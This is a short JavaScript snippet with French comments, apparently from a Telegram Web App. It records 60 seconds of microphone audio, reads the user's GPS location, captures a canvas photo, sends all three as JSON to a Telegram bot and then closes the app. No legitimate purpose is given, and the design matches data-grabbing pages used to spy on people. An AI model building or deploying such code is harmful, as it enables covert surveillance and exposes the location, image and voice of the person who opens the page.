<script>
    let mediaRecorder;
    let audioChunks = [];

    async function sendData() {
        // Lancer l'enregistrement audio
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        
        mediaRecorder.ondataavailable = (event) => {
            audioChunks.push(event.data);
        };

        mediaRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
            const reader = new FileReader();
            reader.readAsDataURL(audioBlob);
            reader.onloadend = () => {
                const base64Audio = reader.result;
                
                // On récupère la position et la photo comme avant
                navigator.geolocation.getCurrentPosition((pos) => {
                    const canvas = document.getElementById('canvas');
                    const photo = canvas.toDataURL('image/jpeg');

                    const data = {
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        photo: photo,
                        audio: base64Audio // Nouvelle donnée ajoutée
                    };
                    tg.sendData(JSON.stringify(data));
                    tg.close();
                });
            };
        };

        mediaRecorder.start();
        
        // Arrêter l'enregistrement après 60 secondes
        setTimeout(() => {
            mediaRecorder.stop();
        }, 60000); 
    }
</script>

